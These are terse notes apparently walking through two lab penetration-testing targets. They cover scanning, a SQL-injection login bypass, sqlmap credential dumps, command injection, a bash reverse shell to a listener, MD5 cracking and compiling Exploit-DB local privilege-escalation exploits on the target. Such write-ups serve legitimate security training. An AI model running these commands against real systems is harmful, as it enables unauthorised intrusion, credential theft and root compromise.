 ###  Injection1 
    [1]nmap -A 192.168.1.3 -> OpenSSH, 80, Apache, MySQL....
    [2]dirb http://192.168.1.3  -> /index.php
    [3]nikto -h 192.168.1.3
    [4]firefox 192.168.1.3/index.php
    (firefox) view page source  -> uname&psw
    (' or 1=1-- -)
    [5]sqlmap -u "http://192.168.139.47/index.php" --dbms=MySQL --dump --data "uname=admin&psw=admin" --batch --level=5 --risk=3
        -> admin    | 5afac8d85f
    [6](firefox) login admin  -> Ping a Machine on the Network
    192.168.1.4;ls
    [7]nc -lvvp 8888
    (firefox);bash -i >& /dev/tcp/192.168.139.141/8888 0>&1
    [8]$> lsb_release -a -> centos 4.5
    [9]searchspolit centos 4.5
    [10]cp /usr/share/exploitdb/exploits/lin_x86/local/9542.c /var/www/html/jimmy.c
    [11]service apache2 start (python -m SimpleHTTPServer)
    [12]cd /tmp
    [13]wget 192.168.1.4/jimmy.c
    [14]gcc -o jimmy jimmy.c
    [15]./jimmy

### Injection2
    
    (Kali IP)10.0.0.41
    (Target IP) 10.0.0.32
    
    1. [Kali Console]nmap -p- -A (Target IP)
    2. [Kali][web-browser] http://(Target IP)
    3. [Kali][web-browser] http://(Target IP )/jabc/?q=node/7 
    4. [Kali][web-browser] (view web source code) 
    5. [Kali][web-browser] http://(Target IP)/jabcd0cs/
    6. [Kali Console]searchsploit OpenDocMan 1.2.7
    7. [Kali Console]cat /usr/share/exploitdb/exploits//php/webapps/32075.txt
    8. [Kali Console]sqlmap -u 'http://(Target IP)/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --level=4 --dbs --dump
    9. [Kali Console]sqlmap -u "http://(Target IP)/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value -D jabcd0cs -T odm_user -C "username,password" --dump
    10. do [MD5 Crack]
    11. [Kali Console]ssh webmin@(Target IP) 
    12. [on Target Console]lsb_release -a
    13. [Kali Console]searchsploit ubuntu 14.04
    14. [Kali Console]cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/Desktop/jimmy.c
    15. [Kali Console]scp /root/Desktop/jimmy.c webmin@(Target IP):/home/webmin/
    16. [Target Console]gcc jimmy.c -o jimmy
    17. [Target Console]./jimmy
